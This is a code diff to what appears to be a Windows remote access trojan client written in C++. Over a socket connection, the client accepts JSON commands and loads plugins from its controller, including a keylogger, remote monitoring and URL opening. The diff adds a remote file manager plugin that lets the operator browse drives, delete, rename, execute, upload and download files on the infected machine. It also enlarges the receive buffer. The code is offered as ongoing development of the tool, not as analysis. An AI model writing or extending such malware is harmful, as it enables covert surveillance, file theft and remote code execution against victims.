@@ -41,6 +41,7 @@ private:
     const string REMOTE_MONITORING_PLUGIN_ID = "RemoteMonitoringPlugin";
     const string KEYLOGGER_PLUGIN_ID = "KeyloggerPlugin";
     const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
+    const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -106,6 +107,14 @@ private:
         }
     }
 
+    void execute_file_manager_command(const json& data) {
+        if (pluginMgr.isPluginLoaded(FILE_MANAGER_PLUGIN_ID)) {
+            pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", sock, data.dump());
+        } else {
+            request_plugin(FILE_MANAGER_PLUGIN_ID, data);
+        }
+    }
+
     void process_json_command(const string& json_str) {
         try {
             auto data = json::parse(json_str);
@@ -133,6 +142,12 @@ private:
             }
             else if (action == "openurl") {
                 execute_open_url_command(data);
+            }
+            else if (action == "getdrives" || action == "getfiles" || action == "deletefile" ||
+                     action == "rename"   || action == "execute"  || action == "createfolder" ||
+                     action == "copyfile" || action == "pastefile" || action == "downloadfile" ||
+                     action == "uploadfile") {
+                execute_file_manager_command(data);
             }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
@@ -219,6 +234,12 @@ private:
                                     } else {
                                         pluginMgr.executePlugin(OPEN_URL_PLUGIN_ID, "RunPlugin", sock);
                                     }
+                                } else if (pluginId == FILE_MANAGER_PLUGIN_ID) {
+                                    if (hasPendingPluginCommand) {
+                                        pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
+                                    } else {
+                                        pluginMgr.executePlugin(FILE_MANAGER_PLUGIN_ID, "RunPlugin", sock);
+                                    }
                                 }
                             }
 
@@ -239,7 +260,7 @@ private:
                     continue;
                 }
 
-                if (recv_buffer.size() > 1024 * 1024) recv_buffer.clear();
+                if (recv_buffer.size() > 128 * 1024 * 1024) recv_buffer.clear();
                 break;
             }
         }
